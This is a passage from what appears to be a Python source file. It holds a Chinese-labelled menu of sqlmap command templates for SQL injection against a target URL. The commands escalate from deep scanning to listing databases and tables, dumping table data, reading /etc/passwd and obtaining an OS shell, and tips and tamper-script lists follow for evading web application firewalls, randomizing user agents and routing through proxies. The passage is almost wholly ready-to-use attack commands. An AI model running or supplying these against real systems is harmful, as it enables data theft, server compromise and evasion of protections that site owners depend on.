            {"name": "深度扫描", "cmd": basic_cmd + " --batch --level=3 --risk=2", "desc": "level=3 高级别检测"},
            {"name": "获取数据库", "cmd": basic_cmd + " --dbs --batch", "desc": "列出所有数据库"},
            {"name": "获取表名", "cmd": basic_cmd + " -D <数据库名> --tables --batch", "desc": "列出指定数据库的所有表"},
            {"name": "导出数据", "cmd": basic_cmd + " -D <数据库名> -T <表名> --dump --batch", "desc": "导出指定表的数据"},
            {"name": "读取文件", "cmd": basic_cmd + " --file-read=/etc/passwd", "desc": "读取服务器文件"},
            {"name": "获取Shell", "cmd": basic_cmd + " --os-shell", "desc": "尝试获取系统shell"},
        ],
        "tips": [
            "--batch: 自动使用默认选项",
            "--level: 检测级别(1-5)，越高越全面",
            "--risk: 风险级别(1-3)，越高越危险",
            "--tamper: 使用脚本绕过WAF",
            "--random-agent: 随机User-Agent",
            "--proxy: 使用代理",
            "--threads: 多线程加速",
        ],
        "tamper_scripts": [
            "space2comment - 空格替换为注释",
            "between - 替换为BETWEEN",
            "charencode - 字符编码",
            "randomcase - 随机大小写",
            "equaltolike - =替换为LIKE",
            "greatest - 替换为GREATEST",
        ]
    }
